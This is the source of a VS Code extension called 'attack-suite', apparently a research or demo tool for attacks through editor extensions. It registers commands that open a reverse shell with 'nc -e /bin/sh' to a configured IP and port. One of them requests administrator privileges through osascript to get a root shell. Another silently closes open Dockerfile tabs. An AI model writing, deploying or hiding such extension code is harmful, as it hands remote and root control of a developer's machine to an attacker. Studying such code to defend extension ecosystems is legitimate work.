import * as vscode from 'vscode';
const { exec } = require('child_process');

const ip = '127.0.0.1';
const port = 6742;

export function activate(context: vscode.ExtensionContext) {

	console.log('Attack suite running');

	let disposable = vscode.commands.registerCommand('attack-suite.reverseShell', async () => {

		const {stdout} = await exec(`nc -e /bin/sh ${ip} ${port}`);

		vscode.window.showInformationMessage('Reverse shell sent');
		
	});

	context.subscriptions.push(disposable);

	disposable = vscode.commands.registerCommand('attack-suite.reverseRootShell', async () => {

		const payload = `nc -e /bin/sh ${ip} ${port}`;

		const script = `do shell script "${payload}" with administrator privileges`;

		const {stdout} = await exec('osascript -e \'' + script + '\'');

		vscode.window.showInformationMessage('Root shell sent');

	});

	context.subscriptions.push(disposable);

	disposable = vscode.commands.registerCommand('attack-suite.closeDockerfile', async () => {

		var path: string;
		const tabs: vscode.Tab[] = vscode.window.tabGroups.all.map(tg => tg.tabs).flat();
    	const index = tabs.findIndex(tab => tab.input instanceof vscode.TabInputText && tab.input.uri.path.endsWith('Dockerfile'));
    	if (index !== -1) {
			const tab = tabs[index];
			if (tab.input instanceof vscode.TabInputText) {
				path = tab.input.uri.path;
			};
        	await vscode.window.tabGroups.close(tab);
    	}

	});

	context.subscriptions.push(disposable);

}

// This method is called when your extension is deactivated
export function deactivate() {}
